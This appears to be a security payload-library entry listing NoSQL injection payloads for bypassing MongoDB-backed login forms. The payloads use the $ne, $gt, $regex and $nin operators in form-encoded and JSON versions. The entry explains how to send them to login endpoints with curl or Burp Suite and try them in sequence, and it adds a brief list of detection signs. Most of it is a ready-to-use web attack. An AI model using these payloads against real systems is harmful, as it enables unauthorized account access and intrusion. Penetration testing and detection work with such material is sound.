---
id: aae476f6-0698-4211-add1-7ff2af65e692
name: NoSQL-Injection-Auth-Bypass-Payloads
type: code
language: json
verified: true
created_at: '2023-04-06T03:56:31.414916+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - payload
  - auth-bypass
validated: true
---

# NoSQL-Injection-Auth-Bypass-Payloads

## Code

```json
in DATA
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

## Description

This code snippet provides sample payloads for NoSQL injection authentication bypass using MongoDB query operators in both form-encoded (DATA) and JSON formats. It targets login forms vulnerable to operator injection, allowing queries to evaluate to true for any credentials.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| No specific variables; payloads are static examples. Customize 'toto', 'foo', 'admin', etc., to values unlikely to match real credentials. | N/A | N/A |

## Usage

Embed these payloads in HTTP POST requests to login endpoints using tools like curl or Burp Suite. For form data, use as -d parameter; for JSON, set Content-Type: application/json. Test in sequence to find the most effective operator for the target.

## Detection

- WAF logs showing requests with $ne, $gt, $regex in POST data.
- Database query logs revealing malformed queries with operators.
- Failed login attempts followed immediately by successful unauthenticated access.
- Anomaly detection on authentication success rates.

## Related

- [[procedures/NoSQL-Injection-Authentication-Bypass-Using-Not-Equal-or-Greater]]
